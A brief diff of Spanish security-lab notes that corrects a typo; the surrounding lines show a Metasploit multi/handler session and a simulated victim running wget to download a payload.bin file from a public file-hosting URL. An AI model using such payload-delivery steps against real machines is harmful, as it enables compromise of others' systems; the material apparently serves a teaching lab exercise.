@@ -1319,7 +1319,7 @@ exit
 msf6 exploit(multi/handler) > exit
 ```
 
-En la máquina de la víctima sinulamos una descarga del href introducido:
+En la máquina de la víctima simulamos una descarga del href introducido:
 
 ```bash
 root@debian:/home/lsi# wget https://tmpfiles.org/dl/207895/payload.bin
